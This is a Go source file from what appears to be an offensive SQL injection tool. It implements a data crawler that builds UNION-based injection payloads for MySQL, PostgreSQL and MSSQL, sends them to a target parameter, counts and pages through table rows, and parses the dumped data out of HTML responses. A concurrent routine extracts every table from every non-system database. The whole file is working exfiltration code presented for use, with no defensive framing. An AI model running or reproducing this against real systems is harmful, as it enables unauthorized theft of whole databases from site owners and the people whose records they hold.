package crawl

import (
	"fmt"
	"strings"
	"sync"
	"hackit/sqli/go/utils"
)

// DataCrawler handles full data extraction from tables
type DataCrawler struct {
	engine EngineInterface
	log    *utils.Logger
}

func NewDataCrawler(e EngineInterface) *DataCrawler {
	return &DataCrawler{engine: e, log: e.GetLogger()}
}

// ExtractTableData extracts all rows from a table with smart batching
func (dc *DataCrawler) ExtractTableData(param, dbms, database, table string, columns []ColumnInfo, batchSize int) ([][]string, error) {
	dc.log.Debug(fmt.Sprintf("Extracting data: %s.%s (%d columns)", database, table, len(columns)))

	// Build column list
	colNames := make([]string, len(columns))
	for i, c := range columns {
		colNames[i] = c.Name
	}
	colList := strings.Join(colNames, ",")

	// Detect row count for progress estimation
	totalRows := dc.detectRowCount(param, dbms, database, table)
	if totalRows > 100000 {
		dc.log.Warning(fmt.Sprintf("Large table: %s.%s (%d rows), sampling first %d", database, table, totalRows, batchSize*10))
		totalRows = batchSize * 10 // Cap for large tables
	}

	var allData [][]string
	offset := 0

	for offset < totalRows {
		batch := dc.extractBatch(param, dbms, database, table, colList, offset, batchSize)
		if len(batch) == 0 {
			break
		}
		allData = append(allData, batch...)
		offset += len(batch)
	}

	return allData, nil
}

func (dc *DataCrawler) extractBatch(param, dbms, database, table, columns string, offset, limit int) [][]string {
	var query string
	switch {
	case strings.Contains(dbms, "MySQL"), strings.Contains(dbms, "MariaDB"):
		escDB := "`" + database + "`"
		escTbl := "`" + table + "`"
		query = fmt.Sprintf("SELECT %s FROM %s.%s LIMIT %d OFFSET %d", columns, escDB, escTbl, limit, offset)
	case strings.Contains(dbms, "PostgreSQL"):
		query = fmt.Sprintf("SELECT %s FROM \"%s\".\"%s\" LIMIT %d OFFSET %d", columns, database, table, limit, offset)
	case strings.Contains(dbms, "MSSQL"):
		query = fmt.Sprintf("SELECT %s FROM [%s].[%s] ORDER BY 1 OFFSET %d ROWS FETCH NEXT %d ROWS ONLY", columns, database, table, offset, limit)
	default:
		query = fmt.Sprintf("SELECT %s FROM %s.%s LIMIT %d OFFSET %d", columns, database, table, limit, offset)
	}

	payload := fmt.Sprintf("' UNION %s-- -", query)
	body, _, _, err := dc.engine.Request(payload, param)
	if err != nil {
		return nil
	}

	return dc.parseDataRows(body)
}

func (dc *DataCrawler) parseDataRows(body string) [][]string {
	var result [][]string
	lines := strings.Split(body, "\n")

	for _, line := range lines {
		line = strings.TrimSpace(line)
		if len(line) == 0 || dc.isNoise(line) {
			continue
		}

		// Try to parse as CSV/TSV
		parts := dc.smartSplit(line)
		if len(parts) > 0 {
			var clean []string
			for _, p := range parts {
				p = strings.Trim(p, "'\" \t")
				if p != "" {
					clean = append(clean, p)
				}
			}
			if len(clean) > 0 {
				result = append(result, clean)
			}
		}
	}
	return result
}

func (dc *DataCrawler) smartSplit(line string) []string {
	// Try tab first
	if strings.Contains(line, "\t") {
		parts := strings.Split(line, "\t")
		if len(parts) > 1 {
			return parts
		}
	}

	// Try comma (respecting quotes)
	if strings.Contains(line, ",") {
		var parts []string
		current := strings.Builder{}
		inQuote := false
		for _, ch := range line {
			if ch == '"' || ch == '\'' {
				inQuote = !inQuote
				current.WriteRune(ch)
			} else if ch == ',' && !inQuote {
				parts = append(parts, current.String())
				current.Reset()
			} else {
				current.WriteRune(ch)
			}
		}
		if current.Len() > 0 {
			parts = append(parts, current.String())
		}
		if len(parts) > 1 {
			return parts
		}
	}

	// Try pipe
	if strings.Contains(line, "|") {
		parts := strings.Split(line, "|")
		if len(parts) > 1 {
			return parts
		}
	}

	return []string{line}
}

func (dc *DataCrawler) isNoise(line string) bool {
	noise := []string{"<!DOCTYPE", "<html", "</html", "<head", "<body", "<script", "<style",
		"<meta", "<link", "<div", "</div", "<span", "<table", "<tr", "<td",
		"HTTP/", "Cache-Control", "Content-Type", "Server:", "Date:", "Set-Cookie"}
	for _, n := range noise {
		if strings.HasPrefix(strings.ToLower(line), strings.ToLower(n)) {
			return true
		}
	}
	return false
}

func (dc *DataCrawler) detectRowCount(param, dbms, database, table string) int {
	var query string
	switch {
	case strings.Contains(dbms, "MySQL"), strings.Contains(dbms, "MariaDB"):
		query = fmt.Sprintf("SELECT COUNT(*) FROM `%s`.`%s`", database, table)
	case strings.Contains(dbms, "PostgreSQL"):
		query = fmt.Sprintf("SELECT COUNT(*) FROM \"%s\".\"%s\"", database, table)
	case strings.Contains(dbms, "MSSQL"):
		query = fmt.Sprintf("SELECT COUNT(*) FROM [%s].[%s]", database, table)
	default:
		query = fmt.Sprintf("SELECT COUNT(*) FROM %s.%s", database, table)
	}

	payload := fmt.Sprintf("' UNION %s-- -", query)
	body, _, _, err := dc.engine.Request(payload, param)
	if err != nil {
		return 0
	}

	count := 0
	// Extract number from response
	lines := strings.Split(body, "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if n, err := fmt.Sscanf(line, "%d", &count); err == nil && n > 0 {
			return count
		}
	}
	return 0
}

// DeepCrawlAll extracts data from ALL tables across ALL databases
func (dc *DataCrawler) DeepCrawlAll(param, dbms string, databases []string, progressCh chan<- string) map[string]map[string][][]string {
	result := make(map[string]map[string][][]string)
	var mu sync.Mutex
	var wg sync.WaitGroup
	sem := make(chan struct{}, 5)

	totalDBs := len(databases)
	for idx, db := range databases {
		if dc.isSystemDB(db) {
			continue
		}
		sem <- struct{}{}
		wg.Add(1)
		go func(dbName string, dbIdx int) {
			defer wg.Done()
			defer func() { <-sem }()

			sc := NewSchemaCrawler(dc.engine)
			tables := sc.CrawlTables(param, dbms, dbName)

			dbData := make(map[string][][]string)
			for _, tbl := range tables {
				cols := sc.CrawlTableDetail(param, dbms, dbName, tbl)
				data, _ := dc.ExtractTableData(param, dbms, dbName, tbl, cols.Columns, 100)
				if data != nil {
					dbData[tbl] = data
				}
				msg := fmt.Sprintf("[%d/%d] DB: %s | Table: %s | Rows: %d", dbIdx+1, totalDBs, dbName, tbl, len(data))
				if progressCh != nil {
					progressCh <- msg
				}
			}

			mu.Lock()
			result[dbName] = dbData
			mu.Unlock()
		}(db, idx)
	}
	wg.Wait()

	return result
}

func (dc *DataCrawler) isSystemDB(name string) bool {
	lower := strings.ToLower(name)
	return lower == "information_schema" || lower == "performance_schema" ||
		lower == "sys" || lower == "mysql" || lower == "pg_catalog" ||
		lower == "template0" || lower == "template1" || lower == "master" ||
		lower == "tempdb" || lower == "model" || lower == "msdb"
}
